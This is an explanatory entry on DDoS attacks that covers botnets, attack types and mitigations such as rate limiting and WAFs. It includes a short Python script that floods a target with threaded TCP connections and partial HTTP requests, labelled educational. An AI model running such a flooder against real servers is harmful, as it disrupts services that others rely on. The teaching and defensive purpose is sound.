title: DDoS (Distributed Denial-of-Service)
content: >
  ### Understanding DDoS Attacks


  A Distributed Denial-of-Service (DDoS) attack is a malicious attempt to
  disrupt the normal functioning of a targeted server, service, or network by
  overwhelming it with a flood of internet traffic. This is achieved by using
  multiple compromised computer systems as sources of attack traffic. These
  systems can include computers and other networked resources such as IoT
  devices.


  #### How DDoS Works


  1. **Botnets**: Attackers often use a network of infected devices, known as a
  botnet, to carry out a DDoS attack. Each device in the botnet sends requests
  to the target, causing it to become overwhelmed and unable to function
  properly.


  2. **Traffic Overload**: The target system is flooded with more requests than
  it can handle, leading to slow performance or complete unavailability of the
  service.


  3. **Types of DDoS Attacks**:
     - **Volume-based attacks**: These use high traffic to saturate the bandwidth of the target.
     - **Protocol attacks**: These consume actual server resources or intermediate communication equipment.
     - **Application layer attacks**: These target the application layer, where web pages are generated on the server and delivered in response to HTTP requests.

  #### Code Example: Simulating a Simple DDoS Attack


  Below is a simplified Python script that demonstrates how a DDoS attack might
  be simulated for educational purposes. **Note: This code is for educational
  purposes only and should not be used for malicious activities.**


  ```python

  import socket

  import threading


  target_ip = '192.168.1.1'  # Example target IP

  target_port = 80           # Example target port


  def attack():
      while True:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target_ip, target_port))
          s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
          s.close()

  for i in range(500):  # Number of threads
      thread = threading.Thread(target=attack)
      thread.start()
  ```


  #### Mitigation Strategies


  1. **Rate Limiting**: Limit the number of requests a user can make to a server
  in a given time frame.

  2. **Web Application Firewalls (WAF)**: Use WAFs to filter and monitor HTTP
  traffic between a web application and the Internet.

  3. **Traffic Analysis**: Continuously analyze traffic to detect and mitigate
  potential DDoS attacks.


  Understanding DDoS attacks is crucial for developing robust security measures
  to protect online services. Always ensure that your systems are equipped with
  the necessary defenses to mitigate such threats.
